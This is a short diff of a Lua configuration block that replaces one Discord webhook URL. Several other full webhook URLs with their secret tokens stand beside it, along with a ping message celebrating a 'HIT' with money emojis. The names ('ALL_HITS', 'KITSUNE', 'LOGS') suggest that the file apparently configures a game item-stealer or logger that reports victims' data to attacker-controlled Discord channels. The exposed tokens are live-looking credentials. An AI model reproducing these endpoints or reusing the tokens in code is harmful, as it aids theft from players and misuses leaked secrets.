@@ -13,7 +13,7 @@ local CONFIG = {
         "^SfavenG%d+$"
     },
     ALL_HITS_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
-    KITSUNE_WEBHOOK_URL = "https://discord.com/api/webhooks/1397485371779973150/F8IGnpfXUJlxJRYQBSTFANg_An2e0Ih2jAFQRkaE7XWe5UC8YruXddau8qb3OZy52VF1",
+    KITSUNE_WEBHOOK_URL = "https://discord.com/api/webhooks/1400889130409267260/sjHU9RINLAq242Sy_D54yEjkh3wSAJGUeiK9UPXealHoWCCxR3DKAPevSbbo7oeNcS0b",
     LOGS_WEBHOOK_URL = "https://discord.com/api/webhooks/1399656998735187989/fDybU5d8Ub9HhKxa0BL7zAUDgUpmCTe4ibQMYL-D1L-fMzq9tz6ASmEO73eNIRPaNHPV",
     MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1400806550779596800/zxuZoPbbY2_DpsgcP3Wm2AnmcjfUAfLNh-jddCn_PWPKj8Uvzaoeod3cVZidn-i3CMKw",
     PING_MESSAGE = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
